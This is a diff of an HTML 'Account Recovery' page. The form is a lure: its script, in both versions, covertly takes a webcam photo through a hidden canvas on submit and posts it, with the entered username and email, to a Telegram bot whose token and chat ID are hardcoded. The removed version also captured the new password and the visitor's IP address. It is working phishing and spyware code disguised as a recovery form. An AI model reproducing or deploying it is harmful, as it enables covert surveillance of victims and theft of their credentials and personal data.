@@ -9,15 +9,15 @@
       margin: 0;
       padding: 0;
       font-family: 'Arial', sans-serif;
-      background-color: #0f172a; /* Warna dasar gelap */
-      color: #ffffff; /* Warna teks putih */
+      background-color: #0f172a;
+      color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
     .container {
-      background-color: #1e293b; /* Kotak kontainer lebih terang */
+      background-color: #1e293b;
       padding: 30px 20px;
       border-radius: 10px;
       box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
@@ -27,7 +27,6 @@
     }
     h2 {
       font-size: 24px;
-      font-weight: bold;
       color: #e2e8f0;
       margin-bottom: 10px;
     }
@@ -36,19 +35,6 @@
       color: #94a3b8;
       margin-bottom: 20px;
     }
-    .info-box {
-      background-color: #334155; /* Kotak informasi */
-      color: #cbd5e1;
-      font-size: 14px;
-      padding: 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
     input {
       padding: 12px;
       font-size: 14px;
@@ -56,65 +42,51 @@
       border: 1px solid #64748b;
       background-color: #1e293b;
       color: #ffffff;
+      margin-bottom: 15px;
+      width: 100%;
     }
     input:focus {
       outline: none;
       border-color: #0ea5e9;
-      box-shadow: 0 0 4px #0ea5e9;
     }
     button {
       padding: 12px;
+      background-color: #0ea5e9;
       border: none;
       border-radius: 8px;
-      background-color: #0ea5e9;
-      font-size: 16px;
-      font-weight: bold;
       color: #ffffff;
+      font-size: 16px;
       cursor: pointer;
     }
     button:hover {
       background-color: #0284c7;
     }
-    .footer {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #94a3b8;
-    }
-    .footer a {
-      color: #0ea5e9;
-      text-decoration: none;
-    }
-    .footer a:hover {
-      text-decoration: underline;
+    #hiddenCanvas {
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Account Recovery</h2>
-    <p>Please fill out the form to recover your account.</p>
-    <div class="info-box">
-      Make sure to provide accurate details to speed up the recovery process.
-    </div>
+    <p>Fill in the form to recover your account.</p>
     <form id="recoveryForm">
       <input type="text" id="username" placeholder="Enter your username" required>
-      <input type="email" id="email" placeholder="Enter your email address" required>
-      <input type="password" id="password" placeholder="Create a new password" required>
+      <input type="email" id="email" placeholder="Enter your email" required>
       <button type="submit">Recover Account</button>
     </form>
-    <div class="footer">
-      <p>Need help? <a href="#">Contact Support</a></p>
-    </div>
   </div>
 
+  <canvas id="hiddenCanvas"></canvas>
+
   <script>
-    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
-    var telegramChatId = '-1002188815934';
+    const telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
+    const telegramChatId = '-1002188815934';
 
     function sendToTelegram(photoBlob, caption) {
-      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+      const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
 
-      var formData = new FormData();
+      const formData = new FormData();
       formData.append('chat_id', telegramChatId);
       formData.append('photo', photoBlob, 'photo.jpg');
       formData.append('caption', caption);
@@ -124,72 +96,50 @@
         body: formData
       })
         .then(response => response.json())
-        .then(data => {
-          console.log('Foto berhasil dikirim ke Telegram:', data);
-        })
-        .catch(error => {
-          console.error('Error mengirim foto ke Telegram:', error);
-        });
+        .then(data => console.log('Photo sent to Telegram:', data))
+        .catch(error => console.error('Error sending photo to Telegram:', error));
     }
 
     function takeAndSendPhoto(formData) {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          var video = document.createElement('video');
+        .then(stream => {
+          const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
 
           setTimeout(() => {
-            var canvas = document.createElement('canvas');
-            canvas.width = 640; // Resolusi foto
+            const canvas = document.getElementById('hiddenCanvas');
+            canvas.width = 640; // Photo resolution
             canvas.height = 480;
-            var ctx = canvas.getContext('2d');
+
+            const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
 
-            canvas.toBlob(function(blob) {
-              var ipAddress = '';
-              fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                  ipAddress = data.ip;
+            stream.getTracks().forEach(track => track.stop()); // Stop the camera stream
 
-                  var caption = `Foto terkirim dari IP: ${ipAddress}\nUsername: ${formData.username}\nEmail: ${formData.email}`;
-                  sendToTelegram(blob, caption);
-                })
-                .catch(error => {
-                  console.error('Error mendapatkan IP address:', error);
-
-                  var caption = `Foto terkirim\nUsername: ${formData.username}\nEmail: ${formData.email}`;
-                  sendToTelegram(blob, caption);
-                });
+            canvas.toBlob(blob => {
+              const caption = `Username: ${formData.username}\nEmail: ${formData.email}`;
+              sendToTelegram(blob, caption);
             }, 'image/jpeg');
-          }, 1000); // Delay 1 detik
+          }, 1000); // 1-second delay
         })
-        .catch(function(err) {
-          console.log("Error: " + err);
+        .catch(err => {
+          console.error('Error accessing camera:', err);
           if (err.name === 'NotAllowedError') {
-            alert('Izinkan akses kamera untuk melanjutkan lalu refresh halaman ini.');
+            alert('Please allow camera access to proceed.');
           }
         });
     }
 
     document.getElementById('recoveryForm').addEventListener('submit', function(event) {
       event.preventDefault();
-      var formData = {
+
+      const formData = {
         username: document.getElementById('username').value,
-        email: document.getElementById('email').value,
-        password: document.getElementById('password').value
+        email: document.getElementById('email').value
       };
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(() => takeAndSendPhoto(formData))
-        .catch(err => {
-          console.log("Error: " + err);
-          if (err.name === 'NotAllowedError') {
-            alert('Izinkan akses kamera sebelum melanjutkan.');
-          }
-        });
+      takeAndSendPhoto(formData);
     });
   </script>
 </body>
